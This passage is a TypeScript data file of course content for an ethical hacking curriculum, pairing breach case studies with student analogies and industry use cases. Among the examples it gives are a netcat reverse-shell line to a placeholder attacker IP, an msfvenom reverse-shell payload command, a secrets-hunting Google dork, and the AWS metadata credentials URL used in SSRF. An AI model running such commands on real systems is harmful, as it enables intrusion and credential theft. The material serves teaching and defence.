import { TopicBreakdown, DayCaseStudy } from '../types';

export interface ModuleEnrichment {
  topicBreakdowns: TopicBreakdown[];
  caseStudy: DayCaseStudy;
}

export const ETHICAL_HACKING_ENRICHMENTS_MAP: Record<number, ModuleEnrichment> = {
  1: {
    caseStudy: {
      title: "Kevin Mitnick Federal Takedown & The Birth of Ethical Hacking",
      incidentYear: "1995",
      targetEntity: "Motorola, Nokia, Sun Microsystems, Pacific Bell",
      summary: "Kevin Mitnick bypassed perimeter security across major telecom networks primarily through phone phreaking and sophisticated social engineering without written authorization. His arrest and subsequent career transformation as an industry-leading white-hat security consultant established modern ethical hacking boundaries, written Rules of Engagement (RoE), and authorization protocols.",
      rootCause: "Complete lack of legal RoE frameworks; reliance on employee trust; lack of multi-factor authentication and identity verification over phone channels.",
      defenseTakeaway: "Never test any system without a signed non-disclosure agreement (NDA) and formal Rules of Engagement (RoE); under Indian IT Act Section 66/66F and the US CFAA, unauthorized access without explicit written consent constitutes a non-bailable criminal offense."
    },
    topicBreakdowns: [
      {
        topicName: "White Hat vs Black Hat vs Grey Hat Hackers",
        studentAnalogy: "A White Hat is a college security guard who tests if hostel doors lock properly with permission; a Black Hat is a thief who picks the locks to steal laptops; a Grey Hat picks the lock without permission to show off, then asks the principal for a reward.",
        industryUseCase: "Corporations hire White Hat certified penetration testers and Red Teams to perform authorized, scoped adversarial simulations to find vulnerabilities before cybercriminal syndicates exploit them."
      },
      {
        topicName: "Rules of Engagement (RoE) & Scope Definition",
        studentAnalogy: "Before playing a cricket match in your neighborhood, everyone agrees on ground boundaries (e.g. hitting into Mrs. Sharma's garden is 'out', and nobody can bowl beamers).",
        industryUseCase: "A formal RoE defines strict testing windows (e.g., 02:00–05:00 UTC), in-scope IP subnets and web domains, explicitly banned methods (like destructive DDoS), and designated emergency escalation contacts."
      },
      {
        topicName: "Legal Frameworks (Indian IT Act 66/66F, CFAA, GDPR)",
        studentAnalogy: "Just like driving a sports car without a valid driver's license will land you in jail even if you didn't crash, probing a university web server without written permission is a cybercrime regardless of your intentions.",
        industryUseCase: "Under Section 43 & 66 of the Indian Information Technology Act, unauthorized system access carries up to 3 years imprisonment and hefty compensation fines; Section 66F penalizes cyber terrorism with life imprisonment."
      },
      {
        topicName: "The 5 Phases of Ethical Hacking",
        studentAnalogy: "Planning a college fest: 1) Reconnaissance (checking guest lists), 2) Scanning (inspecting hall entry gates), 3) Gaining Access (walking through an unbolted back door), 4) Maintaining Access (leaving a wedge in the door), and 5) Clearing Tracks / Reporting (handing in the security assessment log).",
        industryUseCase: "Professional penetration testers follow structured phases: Reconnaissance -> Scanning & Enumeration -> Gaining Access (Exploitation) -> Maintaining Access (Post-Exploitation) -> Analysis & Executive Remediation Reporting."
      },
      {
        topicName: "Bug Bounty Programs & Responsible Disclosure",
        studentAnalogy: "A software student spots a spelling mistake and grading flaw in the campus portal and submits it privately to the IT Dean via the official bug reward program instead of leaking it on Reddit.",
        industryUseCase: "Enterprises host public and private bug bounty programs on platforms like HackerOne and Bugcrowd, rewarding ethical security researchers with monetary bounties for privately reporting vulnerabilities under safe harbor policies."
      }
    ]
  },
  2: {
    caseStudy: {
      title: "Cambridge Analytica & Massive Open Reconnaissance Harvesting",
      incidentYear: "2018",
      targetEntity: "Facebook Graph API & 87 Million Global Users",
      summary: "Cambridge Analytica leveraged passive footprinting and Facebook's overly permissive Graph API v1.0. By getting 270,000 users to complete a personality quiz app, the application passively harvested profiling data on all their friends without their explicit consent, scraping 87 million personal profiles used for targeted political disinformation.",
      rootCause: "Overly permissive public third-party API data sharing; failure to apply Principle of Least Privilege on social graph relationships; absence of automated scraping rate-limiting.",
      defenseTakeaway: "Enforce strict external API data exposure audits; sanitize public metadata and DNS TXT records; continuously monitor and restrict what OSINT data external third parties can harvest."
    },
    topicBreakdowns: [
      {
        topicName: "Passive vs Active Footprinting",
        studentAnalogy: "Passive footprinting is browsing your professor's public LinkedIn and research papers from your bedroom without them ever knowing; Active footprinting is ringing their office doorbell to ask what time they take lunch.",
        industryUseCase: "Pentesters begin with 100% passive OSINT (WHOIS, DNS records, Google Dorks, Wayback Machine) to gather intel without generating a single alert on the target's SOC firewalls, then transition to active reconnaissance."
      },
      {
        topicName: "Advanced Google Dorking (Google Hacking)",
        studentAnalogy: "Using advanced library search tags like 'subject:physics author:hcv' to immediately find a rare reference manual instead of wandering randomly through 50 aisles.",
        industryUseCase: "Attackers and security auditors execute targeted search operators like `site:company.com filetype:env 'DB_PASSWORD'` or `inurl:admin login.php` to identify publicly indexed secrets and exposed dashboards."
      },
      {
        topicName: "DNS Reconnaissance & Zone Transfers",
        studentAnalogy: "Instead of guessing every student's hostel room number one-by-one, you discover an unmanaged copy of the entire campus student directory pinned to a noticeboard.",
        industryUseCase: "Misconfigured DNS servers that allow unrestricted AXFR zone transfers (`dig axfr @ns1.target.com target.com`) leak an organization's entire internal and external hostname mapping in a fraction of a second."
      },
      {
        topicName: "Shodan & IoT/Infrastructure Intelligence",
        studentAnalogy: "A search engine with real-time cameras that tells you which hostel balconies left their lights on and which study rooms have their doors wide open right now.",
        industryUseCase: "Shodan continually banners-scans the global IPv4 internet, letting penetration testers uncover exposed SCADA devices, open Jenkins build servers, unauthenticated Elasticsearch clusters, and exposed RDP ports."
      },
      {
        topicName: "Email Harvesting & Metadata Analysis",
        studentAnalogy: "Looking at the PDF properties of a professor's syllabus slide deck to discover their exact laptop username, operating system version, and printer model.",
        industryUseCase: "Tools like `theHarvester` scrape corporate email conventions, employee names, and subdomains from search engines and PGP key servers to assemble spear-phishing and credential-stuffing target lists."
      }
    ]
  },
  3: {
    caseStudy: {
      title: "Heartland Payment Systems Network Sniffing & Port Intrusion",
      incidentYear: "2008",
      targetEntity: "Heartland Payment Systems (US Credit Card Processor)",
      summary: "Albert Gonzalez and his crew breached Heartland's perimeter through an unpatched web vulnerability, then performed rapid internal network scanning to locate payment processing servers. They installed a packet sniffer that captured unencrypted magnetic stripe data for over 130 million cards, costing Heartland over $140 million in fines.",
      rootCause: "Internal network traffic between transaction processing nodes was unencrypted; lack of internal network segmentation; failure to detect unauthorized SYN scans and packet sniffers.",
      defenseTakeaway: "Implement end-to-end TLS 1.3 encryption for internal transaction pipelines; deploy network intrusion detection systems (NIDS) configured to alert on port scanning and ARP floods; enforce zero-trust microsegmentation."
    },
    topicBreakdowns: [
      {
        topicName: "TCP Three-Way Handshake & Scan Mechanics",
        studentAnalogy: "Calling your friend: 1) You say 'Can you hear me?' (SYN), 2) Friend says 'Yes, can you hear me?' (SYN-ACK), 3) You say 'Yes, let's talk!' (ACK).",
        industryUseCase: "Nmap leverages low-level TCP flag manipulation to determine whether ports are OPEN, CLOSED, or FILTERED by examining whether the host responds with SYN-ACK, RST, or ignores the probe entirely."
      },
      {
        topicName: "Nmap Stealth SYN Scan (-sS) vs TCP Connect (-sT)",
        studentAnalogy: "Stealth scan is ringing your neighbor's doorbell and running away the split second they step toward the door (no full conversation recorded); Connect scan is ringing, waiting, shaking their hand, and signing their visitor register.",
        industryUseCase: "`nmap -sS` sends a raw SYN packet and immediately resets the connection (RST) upon receiving SYN-ACK, preventing older application servers from logging a completed connection."
      },
      {
        topicName: "Service Version Detection (-sV) & OS Fingerprinting (-O)",
        studentAnalogy: "Listening to footsteps outside your door: heavy boots vs sneakers tells you who is approaching before you even open the door.",
        industryUseCase: "By analyzing TCP window sizes, IP TTL defaults, and service greeting banners, Nmap accurately deduces whether a server runs Windows Server 2022 or Ubuntu 22.04 with Apache 2.4.52."
      },
      {
        topicName: "UDP Scanning Challenges (-sU)",
        studentAnalogy: "Dropping a letter into a mailbox that has no delivery receipt: if nobody writes back, either the mailbox is empty, or the recipient is ignoring you.",
        industryUseCase: "UDP is connectionless; scanning services like DNS (53), SNMP (161), and DHCP (67) is slower and relies on receiving ICMP Port Unreachable (Type 3 Code 3) to prove a port is closed."
      },
      {
        topicName: "Masscan & High-Speed Internet Scanning",
        studentAnalogy: "Having a fleet of 1,000 drones check every house in the city simultaneously in 5 minutes rather than one mailman walking street by street.",
        industryUseCase: "Masscan generates asynchronous raw SYN packets, scanning the entire IPv4 internet for open ports in under 6 minutes from a single high-bandwidth gigabit link."
      }
    ]
  },
  4: {
    caseStudy: {
      title: "Sony Pictures 2014 SMB Network Enumeration & Pivot",
      incidentYear: "2014",
      targetEntity: "Sony Pictures Entertainment",
      summary: "State-sponsored threat actors breached Sony's perimeter and spent months executing exhaustive internal enumeration. They probed SMB/Samba network shares, active directory user accounts, and internal servers, extracting unreleased movies, internal executive salary emails, and executive password spreadsheets.",
      rootCause: "Unauthenticated SMB shares accessible across the entire internal corporate network; plaintext credential spreadsheets stored on shared directories; lack of endpoint auditing for enumeration tools.",
      defenseTakeaway: "Disable SMBv1 globally; restrict SMB signing and enforce SMB encryption; audit network shares using automated tools; ensure no plaintext passwords exist in file shares."
    },
    topicBreakdowns: [
      {
        topicName: "Scanning vs Enumeration",
        studentAnalogy: "Scanning is walking down a hostel corridor counting how many doors are open; Enumeration is walking up to an open door, reading the nameplate, writing down student names, and asking what classes they take.",
        industryUseCase: "Scanning finds open ports (e.g. port 445); Enumeration queries the service to extract valid usernames, group memberships, share names, and password policies."
      },
      {
        topicName: "SMB & NetBIOS Enumeration (enum4linux, smbclient)",
        studentAnalogy: "Checking an unlocked student cabinet in the common room to see if it lists all club committee members and their phone numbers.",
        industryUseCase: "Pentesters execute `enum4linux -a 192.168.1.50` to pull Active Directory domain sids, null session shares, password complexity policies, and user accounts from misconfigured Windows/Samba hosts."
      },
      {
        topicName: "SNMP MIB Walking (Simple Network Management Protocol)",
        studentAnalogy: "Finding a security guard's desk notebook with the default master key code 'public' written on the cover, detailing every router and computer in the building.",
        industryUseCase: "SNMPv1/v2c servers configured with the default community string 'public' allow attackers to run `snmpwalk` to extract installed software, running processes, interface IPs, and routing tables."
      },
      {
        topicName: "SMTP User Enumeration (VRFY, EXPN, RCPT TO)",
        studentAnalogy: "Asking the front office receptionist: 'Does a student named Kapil live in Room 204?' and waiting for them to say 'Yes, let me ring him' or 'No such student'.",
        industryUseCase: "Misconfigured mail transfer agents (MTAs) respond to `VRFY root` with 250 (user exists) or 550 (user not found), enabling attackers to validate target email accounts for brute-forcing."
      },
      {
        topicName: "RPC & NFS Share Probing (showmount, rpcclient)",
        studentAnalogy: "Looking into the campus network shared drive to see who left their personal homework folder world-readable without any password.",
        industryUseCase: "Attackers run `showmount -e <target>` to identify world-mountable NFS file systems, mounting `/home` or `/var/backups` directly onto their pentest machine without authentication."
      }
    ]
  },
  5: {
    caseStudy: {
      title: "Equifax 2017 Apache Struts Remote Code Execution (CVE-2017-5638)",
      incidentYear: "2017",
      targetEntity: "Equifax (US Credit Bureau)",
      summary: "Attackers exploited a known vulnerability in Apache Struts (CVE-2017-5638) in Equifax's online dispute portal. The vulnerability allowed remote code execution via a crafted Content-Type HTTP header. The flaw had been patched by Apache two months prior, but Equifax's internal scanning missed the server, leading to the theft of 147 million sensitive records.",
      rootCause: "Failure to patch a critical-severity (CVSS 10.0) vulnerability; lack of asset inventory tracking; failure to renew an SSL certificate on an internal network traffic inspection tool for 10 months.",
      defenseTakeaway: "Implement automated Software Bill of Materials (SBOM) and continuous vulnerability scanners; establish an SLA requiring critical CVSS 9.0+ vulnerabilities to be remediated within 48–72 hours; ensure continuous inspection visibility."
    },
    topicBreakdowns: [
      {
        topicName: "Vulnerability Assessment vs Penetration Testing",
        studentAnalogy: "A medical checkup (Vulnerability Assessment) gives you a list of possible health issues (e.g. cholesterol is a bit high); an endurance stress test (Penetration Test) pushes your body to see if you actually collapse.",
        industryUseCase: "A vulnerability assessment identifies, quantifies, and ranks known security flaws using automated scanners; a pentest actively exploits them to prove real business impact and breach depth."
      },
      {
        topicName: "Understanding CVEs & NVD (National Vulnerability Database)",
        studentAnalogy: "The World Health Organization assigning an official registry code (like COVID-19) so every hospital on earth knows the exact symptoms and vaccine formula.",
        industryUseCase: "Common Vulnerabilities and Exposures (CVE) provides standardized identifiers (e.g., CVE-2021-44228 for Log4Shell) indexed in the NVD with remediation guidance and proof-of-concept exploits."
      },
      {
        topicName: "CVSS v3.1 Scoring Mechanics",
        studentAnalogy: "Grading an exam paper based on: difficulty of the question, whether calculators were allowed, and how many marks it is worth to calculate your final GPA score from 0.0 to 10.0.",
        industryUseCase: "The Common Vulnerability Scoring System calculates severity based on Base Metrics: Attack Vector (Network vs Local), Privileges Required, User Interaction, and Impact on Confidentiality, Integrity, and Availability."
      },
      {
        topicName: "Automated Web & Network Scanners (Nikto, OpenVAS, Nessus)",
        studentAnalogy: "Running a spell-checker and plagiarism scanner across your entire 100-page thesis in 30 seconds instead of reading every word with a magnifying glass.",
        industryUseCase: "Enterprise security teams run weekly authenticated Nessus or OpenVAS scans against cloud infrastructure to detect outdated OpenSSL versions, default credentials, and missing OS security patches."
      },
      {
        topicName: "False Positives vs False Negatives",
        studentAnalogy: "A false positive is a fire alarm ringing when someone just burnt toast; a false negative is a silent smoke detector when an actual fire is burning in the basement.",
        industryUseCase: "Ethical hackers manually verify automated scanner findings to eliminate false positives and craft customized exploit chains for vulnerabilities scanners overlooked."
      }
    ]
  },
  6: {
    caseStudy: {
      title: "LinkedIn 2012 Unsalted SHA-1 Password Breach",
      incidentYear: "2012",
      targetEntity: "LinkedIn Corporation",
      summary: "Russian cybercriminals breached LinkedIn's internal databases and exfiltrated 6.5 million password hashes. The hashes were computed using single-iteration SHA-1 with zero cryptographic salting. Attackers uploaded the hashes to password-cracking forums; within hours, over 90% of the plain-text passwords were recovered using precomputed rainbow tables.",
      rootCause: "Storing user passwords using weak, unsalted, fast cryptographic hashes (SHA-1) instead of slow, memory-hard algorithms (bcrypt, Argon2id, PBKDF2).",
      defenseTakeaway: "Never use MD5 or single SHA iterations for passwords; mandate Argon2id or bcrypt with high work factors and unique cryptographic salts; enforce multi-factor authentication (MFA) across all user logins."
    },
    topicBreakdowns: [
      {
        topicName: "Cryptographic Hashes vs Encryption",
        studentAnalogy: "Hashing is baking a cake: you cannot turn a baked chocolate cake back into eggs, flour, and sugar (one-way); Encryption is locking a diary with a key: with the key, you can lock and unlock it whenever you want (two-way).",
        industryUseCase: "Passwords must never be encrypted; they must be hashed using one-way algorithms so that even a database administrator or attacker who steals the database cannot reverse them."
      },
      {
        topicName: "Password Salts, Peppers & Rainbow Tables",
        studentAnalogy: "If you and your roommate both bake chocolate cakes using the exact same recipe, they taste identical; but if you sprinkle random secret spices into yours, nobody can guess your exact recipe.",
        industryUseCase: "A cryptographic salt is a unique random string appended to each password before hashing, completely neutralizing precomputed rainbow table lookup attacks."
      },
      {
        topicName: "Dictionary Attacks vs Brute Force vs Rule-Based Attacks",
        studentAnalogy: "Brute force is trying every combination on a 4-digit suitcase lock (0000, 0001, ... 9999); Dictionary attack is guessing '1234', '0000', or your birthday first.",
        industryUseCase: "Hashcat and John the Ripper apply mutation rules (e.g. converting 'password' to 'P@$$w0rd2026!') to standard wordlists like `rockyou.txt` to crack complex passwords in seconds."
      },
      {
        topicName: "GPU Acceleration & Hashcat Benchmarking",
        studentAnalogy: "Having one university professor solve 10 complex math problems (CPU) vs hiring a stadium of 5,000 students to solve 5,000 simple additions at the same second (GPU).",
        industryUseCase: "Modern penetration testing rigs utilize clustered NVIDIA RTX 4090 GPUs capable of testing over 100 billion NTLM or MD5 password guesses per second."
      },
      {
        topicName: "Online vs Offline Password Cracking (Hydra vs Hashcat)",
        studentAnalogy: "Online cracking is typing passwords on a website login page until your account gets locked out; Offline cracking is downloading the lock to your room and experimenting with 1,000 keys with no lockouts.",
        industryUseCase: "Hydra attacks active live network services (SSH, FTP, RDP) throttled by network latency and account lockout policies; Hashcat attacks stolen offline hash dumps at maximum GPU speed."
      }
    ]
  },
  7: {
    caseStudy: {
      title: "Stuxnet Industrial SCADA Sabotage",
      incidentYear: "2010",
      targetEntity: "Natanz Nuclear Uranium Enrichment Facility, Iran",
      summary: "Stuxnet was the world's first known cyberweapon designed to cause physical destruction. It weaponized four zero-day Windows exploits, infected systems via USB drives to jump an air-gapped facility, and searched specifically for Siemens S7-300 Programmable Logic Controllers (PLCs). It subtly manipulated the frequency of gas centrifuges while sending fake 'normal' telemetry to human operators, destroying 1,000 centrifuges.",
      rootCause: "Air-gapped isolation was defeated via infected USB thumb drives; lack of digital signature verification on PLC firmware; lack of independent analog safety monitoring.",
      defenseTakeaway: "Air-gaps alone are insufficient; enforce strict USB media controls; implement firmware integrity verification and cryptographic signing; establish independent out-of-band analog telemetry."
    },
    topicBreakdowns: [
      {
        topicName: "Payloads: Staged vs Stageless",
        studentAnalogy: "A staged payload is sending a scout into a campus building who then opens the side door to let the rest of the crew in; A stageless payload is dropping the entire team at once via parachute.",
        industryUseCase: "Staged payloads (`windows/meterpreter/reverse_tcp`) use a tiny stub to bypass network buffer limits, which then downloads the full Meterpreter DLL into memory; stageless payloads bundle everything in one binary."
      },
      {
        topicName: "Metasploit Framework & Meterpreter",
        studentAnalogy: "A master mechanic's toolbox containing pre-measured wrenches, jacks, and diagnostic computers for every major car brand in existence.",
        industryUseCase: "Metasploit allows penetration testers to pair verified exploit modules with flexible payloads to execute controlled proof-of-concept intrusions and post-exploitation auditing."
      },
      {
        topicName: "Reverse Shells vs Bind Shells",
        studentAnalogy: "Bind shell is your friend waiting in their room for you to call them (firewall blocks incoming calls); Reverse shell is your friend calling you from inside their room to yours (firewall permits outgoing calls).",
        industryUseCase: "Because enterprise firewalls block unsolicited inbound traffic to internal workstations, penetration testers almost exclusively deploy reverse shells (`nc -e /bin/bash <attacker_ip> 4444`)."
      },
      {
        topicName: "Msfvenom & Payload Generation",
        studentAnalogy: "A factory that manufactures customized USB adapters tailored to fit whatever phone or outlet socket you encounter on your trip.",
        industryUseCase: "`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf` creates custom standalone executables tailored for specific target architectures."
      },
      {
        topicName: "Antivirus Evasion & Obfuscation Techniques",
        studentAnalogy: "Writing a secret love letter in Caesar cipher code so your nosy hostel roommate cannot read it when looking over your shoulder.",
        industryUseCase: "Attackers and Red Teams utilize polymorphic shellcode, crypters, and in-memory execution techniques (like reflective DLL injection) to prevent signature-based AV/EDR detections."
      }
    ]
  },
  8: {
    caseStudy: {
      title: "DigiNotar Rogue SSL Certificate Authority Breach",
      incidentYear: "2011",
      targetEntity: "DigiNotar (Dutch Certificate Authority)",
      summary: "Hackers compromised Dutch CA DigiNotar's internal servers and issued over 500 fraudulent wildcard SSL certificates, including `*.google.com`. Threat actors used these forged certificates combined with man-in-the-middle (MITM) BGP routing redirection to intercept communications of over 300,000 Iranian users visiting Gmail and Google search without triggering browser SSL warning dialogs.",
      rootCause: "Poorly segmented internal Certificate Authority network; lack of multi-factor authorization for signing intermediate root certificates; unpatched public web servers connected to CA infrastructure.",
      defenseTakeaway: "Implement Certificate Transparency (CT) logs to immediately detect unauthorized certificates; enforce HTTP Strict Transport Security (HSTS) with preloading; mandate hardware security modules (HSMs) for root signing keys."
    },
    topicBreakdowns: [
      {
        topicName: "Man-In-The-Middle (MITM) Attack Concepts",
        studentAnalogy: "You pass a secret folded note to your classmate in lecture, but the student sitting in between unfolds it, reads it, writes something mean on it, refolds it, and passes it along.",
        industryUseCase: "MITM attacks enable adversaries to transparently intercept, decrypt, alter, or inject malicious payloads into communications between client workstations and backend cloud servers."
      },
      {
        topicName: "ARP Cache Poisoning & Spoofing (Ettercap, Arpspoof)",
        studentAnalogy: "A mischievous student runs down the hallway shouting: 'Hey everyone, the teacher moved into Room 102!' so all questions get directed to him instead of the real teacher.",
        industryUseCase: "By transmitting unsolicited ARP replies across a local broadcast domain, an attacker tells the target that the router's IP belongs to the attacker's MAC address, routing all subnet traffic through their laptop."
      },
      {
        topicName: "Wireshark Packet Analysis & Filter Syntax",
        studentAnalogy: "Using a high-speed x-ray scanner on an airport conveyor belt that lets you filter for only bags containing metal objects or liquids.",
        industryUseCase: "Pentesters and SOC analysts use display filters like `http.request.method == 'POST'`, `ip.addr == 192.168.1.10`, and `tcp.analysis.retransmission` to isolate credentials and anomalies in raw pcap streams."
      },
      {
        topicName: "SSL/TLS Stripping (Moxie Marlinspike's SSLstrip)",
        studentAnalogy: "A fraudulent taxi driver drops you off at a dark side alley right outside the hotel instead of the hotel's secure underground parking garage.",
        industryUseCase: "SSLstrip intercepts HTTP redirects (`302 Found`), transparently downgrading HTTPS links to insecure plaintext HTTP before the browser can initiate a TLS handshake."
      },
      {
        topicName: "DNS Spoofing & Cache Poisoning",
        studentAnalogy: "Tampering with the college bus timetable posted on the cafeteria wall so the bus takes everyone to a fake party house instead of the campus library.",
        industryUseCase: "Adversaries flood DNS resolvers with forged response packets containing an attacker's IP address, redirecting corporate web traffic to clone phishing portals."
      }
    ]
  },
  9: {
    caseStudy: {
      title: "Twitter 2020 VIP Internal Spear-Phishing & SIM-Swap Hack",
      incidentYear: "2020",
      targetEntity: "Twitter (X) Corporate Admin Console",
      summary: "Teenage hackers used phone spear-phishing (vishing) targeting Twitter customer service and IT employees who were working remotely. Posing as internal IT support, they persuaded staff to enter their credentials on a lookalike VPN portal, bypassed 2FA, and accessed Twitter's internal administrative dashboard, hijacking accounts belonging to Elon Musk, Barack Obama, Bill Gates, and Apple to promote a Bitcoin doubling scam.",
      rootCause: "Over-reliance on SMS/TOTP authentication vulnerable to reverse-proxy phishing; excessive internal employee permissions allowing customer support reps to reset arbitrary VIP credentials.",
      defenseTakeaway: "Deploy FIDO2/WebAuthn physical hardware keys (YubiKeys) immune to reverse-proxy phishing; enforce separation of duties and multi-party authorization for high-privilege account resets."
    },
    topicBreakdowns: [
      {
        topicName: "Social Engineering Psychological Triggers",
        studentAnalogy: "Someone wearing an official-looking uniform runs up to you in the exam hall shouting: 'Emergency! Hand over your phone right now, the dean ordered an immediate check!' (exploiting Authority and Urgency).",
        industryUseCase: "Social engineering manipulates cognitive human biases: Urgency ('Invoice overdue'), Authority ('Message from CEO'), Scarcity ('Only 3 tickets left'), and Fear ('Account suspended in 1 hour')."
      },
      {
        topicName: "Phishing vs Spear Phishing vs Whaling vs Vishing",
        studentAnalogy: "Phishing is casting a net in the ocean hoping for any fish; Spear-phishing is aiming a harpoon at a specific salmon; Whaling is hunting the blue whale (the CEO); Vishing is calling on the phone pretending to be campus bank staff.",
        industryUseCase: "Red Teams craft tailored spear-phishing campaigns referencing real vendor relationships and projects to test whether executives click weaponized PDF lures."
      },
      {
        topicName: "Social-Engineer Toolkit (SET) & Credential Harvesters",
        studentAnalogy: "Photocopying your college library card renewal form and placing it on a clipboard at the library entrance to see who writes down their registration ID and password.",
        industryUseCase: "`setoolkit` automates the cloning of corporate SSO login portals (e.g. Microsoft 365, Okta) to measure employee susceptibility during authorized security awareness training audits."
      },
      {
        topicName: "Physical Security Testing & Tailgating (Piggybacking)",
        studentAnalogy: "Carrying two heavy cardboard boxes of pizza with both hands and smiling at the hostel student ahead of you so they hold the RFID card door open for you.",
        industryUseCase: "Physical penetration testers assess building perimeters, badge-cloning RFID weaknesses, lock vulnerabilities, and employee adherence to anti-tailgating security guidelines."
      },
      {
        topicName: "Defenses: DMARC, DKIM, SPF & FIDO2 WebAuthn",
        studentAnalogy: "A letter arriving in an official wax-sealed envelope verified by the university post office (SPF/DKIM), plus requiring your physical thumbprint to read it (FIDO2).",
        industryUseCase: "SPF validates sender server IPs; DKIM provides cryptographic message signatures; DMARC tells receiving servers to reject spoofed emails; FIDO2 hardware keys prevent phishing entirely."
      }
    ]
  },
  10: {
    caseStudy: {
      title: "Mirai Botnet Dyn DNS Attack & Global Internet Blackout",
      incidentYear: "2016",
      targetEntity: "Dyn Managed DNS Provider, US East Coast",
      summary: "The Mirai botnet infected over 300,000 Internet of Things (IoT) consumer devices (CCTV cameras, home routers, baby monitors) by scanning the internet for 60 common default factory usernames and passwords. Mirai harnessed these infected devices to launch a 1.2 Tbps multi-vector DDoS attack against Dyn's infrastructure, knocking Twitter, Netflix, GitHub, and Spotify offline for hours.",
      rootCause: "Consumer IoT devices shipped with hardcoded default factory telnet credentials (`root:admin`, `admin:12345`) accessible from the public internet without firmware update capabilities.",
      defenseTakeaway: "Legislate bans on default hardcoded IoT passwords; deploy Anycast DNS architectures with high-capacity scrubbing centers; implement automated BGP Flowspec and rate-limiting at upstream tier-1 ISPs."
    },
    topicBreakdowns: [
      {
        topicName: "DoS vs DDoS: Architectural Differences",
        studentAnalogy: "DoS is one student screaming in a professor's face so nobody else can ask questions; DDoS is hiring a crowd of 500 people with megaphones shouting simultaneously so nobody can hear anything.",
        industryUseCase: "DoS originates from a single IP/machine; Distributed Denial of Service (DDoS) leverages thousands of geographically dispersed botnet nodes to overwhelm bandwidth, firewalls, and application CPU pools."
      },
      {
        topicName: "Volumetric vs Protocol vs Application Layer Attacks",
        studentAnalogy: "Volumetric is filling your hostel room with 10,000 basketballs so you can't walk in; Protocol is breaking the door hinges; Application layer is ordering 5,000 pizzas to your room address at once.",
        industryUseCase: "Volumetric attacks (NTP/DNS amplification) flood physical network pipes; Protocol attacks (SYN floods) exhaust firewall state tables; Application layer attacks (HTTP POST/Slowloris) exhaust web server worker threads."
      },
      {
        topicName: "SYN Flood & TCP Half-Open State Exhaustion",
        studentAnalogy: "Calling 100 students on the phone, having them answer 'Hello?', but you never reply, leaving them waiting on the line indefinitely with their phones occupied.",
        industryUseCase: "Attackers send a continuous stream of SYN packets from spoofed IPs. The server allocates kernel memory buffers awaiting the final ACK until connection queues (`backlog`) overflow, rejecting legitimate users."
      },
      {
        topicName: "Slowloris & Application Resource Starvation",
        studentAnalogy: "Going to the canteen counter during lunch hour, ordering a cup of tea, and taking 15 minutes to count out 10 individual 50-paisa coins one by one while 200 hungry students wait behind you.",
        industryUseCase: "Slowloris sends partial HTTP headers at extremely slow intervals (e.g. 1 byte every 10 seconds), holding server connection threads open indefinitely with negligible attacker bandwidth."
      },
      {
        topicName: "DDoS Mitigation Strategies (Anycast, Scrubbing, Cloudflare)",
        studentAnalogy: "Instead of one campus gate taking 50,000 students at 09:00, you open 50 regional gates across the city equipped with metal detectors and automated ticket turnstiles.",
        industryUseCase: "Modern defenses utilize Anycast routing to disperse attack traffic across global points of presence (PoPs) where cloud scrubbing centers filter out malicious volumetric packets using machine learning."
      }
    ]
  },
  11: {
    caseStudy: {
      title: "Capital One 2019 SSRF AWS Metadata Breach",
      incidentYear: "2019",
      targetEntity: "Capital One Financial Corporation",
      summary: "Former AWS software engineer Paige Thompson exploited a Server-Side Request Forgery (SSRF) vulnerability in an open-source ModSecurity Web Application Firewall (WAF) misconfigured on an EC2 instance. She forced the server to query the internal AWS instance metadata service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), exfiltrating temporary cloud admin credentials that allowed downloading 106 million credit card applications from S3 buckets.",
      rootCause: "Overly permissive IAM role attached to the EC2 instance; misconfigured WAF vulnerable to SSRF; lack of IMDSv2 token protection on AWS metadata services.",
      defenseTakeaway: "Mandate AWS IMDSv2 requiring session token headers (`X-aws-ec2-metadata-token`); apply Principle of Least Privilege to cloud IAM instance profiles; encrypt all cloud object storage (S3) with customer-managed KMS keys."
    },
    topicBreakdowns: [
      {
        topicName: "OWASP Top 10 Web Application Vulnerabilities",
        studentAnalogy: "The World Health Organization's annual list of the 10 most contagious and dangerous diseases that doctors must screen for every patient.",
        industryUseCase: "The Open Web Application Security Project (OWASP) Top 10 provides developers and penetration testers with an authoritative consensus on the most critical web risks, including Broken Access Control, Injection, and SSRF."
      },
      {
        topicName: "Burp Suite: Intercepting Proxy & Repeater",
        studentAnalogy: "A magic magnifying glass that pauses time whenever your web browser sends a request, allowing you to edit the price tag from ₹1,000 to ₹1 before letting the packet fly.",
        industryUseCase: "Burp Suite sits between the tester's browser and target web server, enabling deep inspection, manipulation, fuzzing, and automated vulnerability scanning of HTTP/WebSocket traffic."
      },
      {
        topicName: "Broken Object Level Authorization (BOLA / IDOR)",
        studentAnalogy: "Logging into your college results portal, seeing your URL says `report?student_id=1054`, changing it to `report?student_id=1055`, and instantly seeing your classmate's grades.",
        industryUseCase: "Insecure Direct Object References (IDOR) happen when applications expose internal database keys without validating whether the authenticated user actually owns or is authorized to view that object."
      },
      {
        topicName: "Cross-Site Scripting (XSS): Stored, Reflected, DOM",
        studentAnalogy: "Writing a malicious invisible ink prank on a public college noticeboard; whenever any student walks up to read the noticeboard, the ink sprays water in their face.",
        industryUseCase: "XSS occurs when unvalidated user input is executed as JavaScript in victims' browsers, enabling session cookie theft (`document.cookie`), credential harvesting, and keylogging."
      },
      {
        topicName: "Server-Side Request Forgery (SSRF)",
        studentAnalogy: "Tricking the college librarian into walking into the closed staff vault to bring you a secret document because only employees are allowed to walk through the vault door.",
        industryUseCase: "SSRF tricks backend web servers into initiating unauthorized network requests to internal, non-internet-facing infrastructure, such as cloud metadata endpoints or internal Redis caches."
      }
    ]
  },
  12: {
    caseStudy: {
      title: "TalkTalk 2015 Blind SQL Injection Data Heist",
      incidentYear: "2015",
      targetEntity: "TalkTalk Telecom Group (UK ISP)",
      summary: "A 15-year-old amateur hacker used automated tools like `sqlmap` to find and exploit a blind SQL injection vulnerability on an unmanaged, legacy web portal acquired by TalkTalk years earlier. The attacker extracted personal details, bank account numbers, and sort codes for 156,959 customers, leading to a record £400,000 regulatory fine and an estimated £60 million loss in brand value.",
      rootCause: "Legacy web server running outdated PHP script with unsanitized SQL query concatenation; failure to maintain an inventory of legacy subsidiary assets; lack of database input parameterization.",
      defenseTakeaway: "Mandate parameterized queries (Prepared Statements) or modern ORMs for all database queries; decommission or isolate legacy web applications; deploy Web Application Firewalls (WAF) to detect automated SQLi probes."
    },
    topicBreakdowns: [
      {
